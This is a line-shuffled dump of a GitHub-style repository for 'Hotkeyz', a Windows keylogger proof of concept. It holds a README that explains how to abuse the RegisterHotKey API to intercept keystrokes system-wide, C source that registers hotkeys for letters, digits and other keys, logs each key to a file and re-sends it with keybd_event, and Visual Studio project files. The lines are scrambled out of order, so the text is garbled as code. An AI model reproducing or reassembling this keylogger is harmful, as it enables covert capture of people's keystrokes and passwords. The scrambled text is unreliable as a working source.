@@ -1,0 +1,306 @@
+    
+                                                                                                   
+               - ... - arguments for the format string message.                                    
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <Filter>Source Files</Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <SDLCheck>true</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+      <WarningLevel>Level4</WarningLevel>
+    </ClCompile>
+    </Filter>
+    </Link>
+    </ProjectConfiguration>
+    <CharacterSet>Unicode</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <Keyword>Win32Proj</Keyword>
+    <Link>
+    <LinkIncremental>false</LinkIncremental>
+    <LinkIncremental>true</LinkIncremental>
+    <PlatformToolset>v142</PlatformToolset>
+    <ProjectGuid>{2deff2ca-c313-4d85-aeee-414bac32e7ae}</ProjectGuid>
+    <RootNamespace>Hotkeyz</RootNamespace>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+ - messages are not being sent to the intended Window!  
+ 0 : -1
+ 0xFFFF0000) >> 16)
+ Constant:     POLL_TIME_MILLIS                                                                    
+ File:         Hotkeyz.c                                                                           
+ Function:     keylogging_Run                                                                      
+ Function:     wmain                                                                               
+ Global:       g_atVkRanges                                                                        
+ Hotkey-based keylogger for Windows
+ Macro:        DEBUG_MSG                                                                           
+ Parameters:   - hFile - the file to write to.                                                     
+ Parameters:   - pwszFmt - the format string for the debug message.                                
+ Purpose:      Container for a virtual-key range.                                                  
+ Purpose:      Creates a debug message.                                                            
+ Purpose:      Hotkeys-based keylogger proof-of-concept by @yo_yo_yo_jbo.                          
+ Purpose:      Main functionality.
+ Purpose:      Runs the keylogger by registering hotkeys and intercepting them for a defined time. 
+ Purpose:      Specifies the commandline arguments.                                                
+ Purpose:      Specifies the virtual-key ranges to be used by the keylogger.                       
+ Purpose:      The number of milliseconds to poll for the next message.                            
+ The code
+ Type:         CMDLINE_ARGS                                                                        
+ Type:         VK_RANGE                                                                            
+ Visual Studio Version 16
+ What are hotkeys
+ messages).
+ nRangeCounter
+ nRangeCounter < ARRAYSIZE(g_atVkRanges)
+ nVkCounter
+ nVkCounter < ARRAYSIZE(adwVkToIdMapping)
+ nVkCounter <= g_atVkRanges[nRangeCounter].dwHiVk
+ ppwszArgv
+ since I didn't want to create my own Window. This means the registers keys are going to be associated with my thread.
+ works 
+![Hotkeyz](logo.png)
+"    - ppwszArgv - the arguments - we expect one argument only, as per the usage."
+"    <ClCompile Include=""Hotkeyz.c"" />"
+"    <ClCompile Include=""Hotkeyz.c"">"
+"    <Filter Include=""Header Files"">"
+"    <Filter Include=""Resource Files"">"
+"    <Filter Include=""Source Files"">"
+"    <Import Project=""$(UserRootDir)"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+" Parameters:   - nArgc - the number of arguments - we expect one argument only, as per the usage."
+" Returns:      0 upon success, non-zero otherwise.                                                 "
+" Returns:      TRUE upon success, FALSE otherwise.                                                 "
+" Window Messages are going to only arrive to my thread message queue, as stated in MSDN."
+" hotkeys, i.e. you get to intercept them, even before they are sent to any thread message pump.  "
+"(VOID)UnregisterHotKey(NULL, adwVkToIdMapping[cCurrVk])"
+"(VOID)UnregisterHotKey(NULL, adwVkToIdMapping[nVkCounter])"
+", but I uploaded the Visual Studio 2019 project here.  "
+"- Unregistering the relevant hotkey. For that I need a quick mapping between the Virtual Key code and the ID I registered the hotkey with, which is quite easy to accomplish with an array."
+"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"Basically, you supply the following arguments:"
+"CMDLINE_ARG_FILEPATH,"
+"CMDLINE_ARG_KEYLOGGING_TIME_MILLISECONDS = 1,"
+"DEBUG_MSG(L""CreateFileW() failed (LastError=%lu)."", GetLastError())"
+"DEBUG_MSG(L""ExpandEnvironmentStringsW() failed (LastError=%lu)."", GetLastError())"
+"DEBUG_MSG(L""Invalid commandline argument."")"
+"DEBUG_MSG(L""Invalid number of commandline arguments."")"
+"DEBUG_MSG(L""RegisterHotKey() failed (nVkCounter=%lu, LastError=%lu)."", nVkCounter, GetLastError())"
+"DEBUG_MSG(L""RegisterHotKey() failed for re-registration (cCurrVk=%lu, LastError=%lu)."", cCurrVk, GetLastError())"
+"DEBUG_MSG(L""Was not able to write all data to file (cbBytesWritten=%lu)."", cbBytesWritten)"
+"DEBUG_MSG(L""WriteFile() failed (LastError=%lu)."", GetLastError())"
+"DEBUG_MSG(L""keylogging_Run() failed."")"
+"HANDLE hFile,"
+"I decided to use the [RegisterHotKey](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey) WinAPI to register ""hotkeys"" for all across the keyboard.  "
+"I thought this could be a nice opportunity to share a (not so) novel keylogging technique, based on Hotkeys!"
+"INT nArgc,"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""Hotkeyz"", ""Hotkeyz.vcxproj"", ""{2DEFF2CA-C313-4D85-AEEE-414BAC32E7AE}"""
+"So, I saw a bunch of articles specifying different methods for keylogging (such as [this](https://www.elastic.co/security-labs/protecting-your-devices-from-information-theft-keylogger-protection-jp)) and I never found one that I used internally in the past.  "
+"Stay tuned,"
+"The other thing I had to take care of is not blocking - I intend on keylogging for a user-defined amount of milliseconds, so I use the [PeekMessage](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagea) WinAPI to not block - I do poll if there are no messages to be processed. Note that I have to perform it from my own thread since the "
+"To solve that problem, I perform the ol' switcheroo:"
+"While I'd never put this in ""production code"", the rate of typing makes it barely noticable, so this works well."
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"You can easily re-implement in PowerShell or compile it as a DLL instead of an executable. However, I bear no responsibility on how this is going to be used."
+"cCurrVk, sizeof(cCurrVk), "
+"cbBytesWritten, NULL))"
+"define DEBUG_MSG(pwszFmt, ...)      (VOID)wprintf(L""%S: "" pwszFmt L"""
+"define DEBUG_MSG(pwszFmt, ...)"
+"hFile = CreateFileW(wszFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL)"
+"if (!RegisterHotKey(NULL, adwVkToIdMapping[cCurrVk], 0, cCurrVk))"
+"if (!RegisterHotKey(NULL, iCurrId, 0, nVkCounter))"
+"if (!WriteFile(hFile, "
+"if (!keylogging_Run(hFile, dwKeyloggingTime))"
+"if (0 == ExpandEnvironmentStringsW(ppwszArgv[CMDLINE_ARG_FILEPATH], wszFilePath, ARRAYSIZE(wszFilePath)))"
+"keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL)"
+"n"", __FUNCTION__, __VA_ARGS__)"
+"tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE))"
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"xml version=""1.0"" encoding=""utf-8"""
+"{ '0', '9' },"
+"{ 'A', 'Z' },"
+"{ VK_BACK, VK_TAB },"
+"{ VK_INSERT, VK_DELETE },"
+"{ VK_NUMPAD0, VK_DIVIDE }"
+"{ VK_RETURN, VK_RETURN },"
+"{ VK_SPACE, VK_SPACE },"
+$(Platform)'=='Debug
+$(Platform)'=='Release
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+(VOID)CloseHandle(hFile)
+(VOID)FlushFileBuffers(hFile)
+- A unique identifier of type 
+- Modifiers (e.g. whether SHIFT is pressed). I didn't use any modifiers but you can intercept more stuff that way if you so choose.
+- Re-registering the hotkey again by calling [RegisterHotKey](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey) one more time.
+- Receiving hotkeys (by intercepting 
+- The [Virtual Key code](https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes) to register.
+- The window - I use 
+- Using the [keybd_event](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-keybd_event) WinAPI to simulate a keypress.
+- dwTimeoutMilliseconds - the amount of milliseconds to perform keylogging.         
+// Continously read messages
+// Expand environment strings for the input file path
+// Flush the file (best-effort)
+// Free resources
+// Get the key from the message
+// Get the keylogging time in milliseconds
+// Get the message in a non-blocking manner and poll if necessary
+// Only handle hotkeys (should not really happen)
+// Open the file for writing
+// Register all relevant virtual keys
+// Return result
+// Return the result
+// Run the keylogging functionality
+// Send the key to the OS and re-register
+// Success
+// Unregister all registered hotkeys
+// Validate everything was properly written
+// Validate number of arguments
+// Write to the file
+</Project>
+BOOL
+BOOL bResult = FALSE
+BYTE cCurrVk = 0
+CMDLINE_ARG_MAX
+DWORD cbBytesWritten = 0
+DWORD dwHiVk
+DWORD dwKeyloggingTime = 0
+DWORD dwLoVk
+DWORD dwTimeoutMilliseconds
+DWORD nVkCounter = 0
+Debug
+EndGlobal
+EndGlobalSection
+EndProject
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HANDLE hFile = INVALID_HANDLE_VALUE
+HideSolutionNode = FALSE
+Hotkeyz.c
+I ended up coding a single file 
+INT adwVkToIdMapping[256] = { 0 }
+INT iCurrId = 0
+Jonathan Bar Or
+MSG tMsg = { 0 }
+MinimumVisualStudioVersion = 10.0.40219.1
+NDEBUG
+NULL
+PWSTR
+RegisterHotKey
+Release
+SIZE_T nRangeCounter = 0
+Sleep(POLL_TIME_MILLIS)
+SolutionGuid = {8F8CA1F9-4B60-42EE-9C27-DC42AE104056}
+The huge advantage is that these are 
+The only obstacle I had was that 
+ULONGLONG ullBaseTickCount = 0
+VK_RANGE
+VisualStudioVersion = 16.0.34902.97
+WCHAR wszFilePath[MAX_PATH] = { 0 }
+WM_HOTKEY
+_CONSOLE
+_DEBUG
+adwVkToIdMapping[cCurrVk] = 0
+adwVkToIdMapping[nVkCounter] = iCurrId
+asmx</Extensions>
+bResult = TRUE
+cCurrVk = (BYTE)((((DWORD)tMsg.lParam) 
+continue
+cppm
+define POLL_TIME_MILLIS (50)
+dwKeyloggingTime = (DWORD)_wtol(ppwszArgv[CMDLINE_ARG_KEYLOGGING_TIME_MILLISECONDS])
+else
+endif
+for (nRangeCounter = 0
+for (nVkCounter = 0
+for (nVkCounter = g_atVkRanges[nRangeCounter].dwLoVk
+g_atVkRanges[] = {
+goto lblCleanup
+hFile = INVALID_HANDLE_VALUE
+iCurrId
+if (!PeekMessageW(
+if (0 != adwVkToIdMapping[nVkCounter])
+if (0 == dwKeyloggingTime)
+if (CMDLINE_ARG_MAX != nArgc)
+if (INVALID_HANDLE_VALUE != hFile)
+if (INVALID_HANDLE_VALUE == hFile)
+if (WM_HOTKEY != tMsg.message)
+if (sizeof(cCurrVk) != cbBytesWritten)
+ifdef _DEBUG
+include <stdio.h>
+include <windows.h>
+jpeg
+keylogging_Run(
+lblCleanup:
+mfcribbon-ms</Extensions>
+resx
+return bResult
+return bResult 
+static
+system-wide
+tiff
+too well
+typedef enum
+typedef struct _VK_RANGE
+ullBaseTickCount = GetTickCount64()
+while (GetTickCount64() - ullBaseTickCount < dwTimeoutMilliseconds)
+wmain(
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+xsd</Extensions>
+{2DEFF2CA-C313-4D85-AEEE-414BAC32E7AE}.Debug
+{2DEFF2CA-C313-4D85-AEEE-414BAC32E7AE}.Release
+} CMDLINE_ARGS
+} VK_RANGE
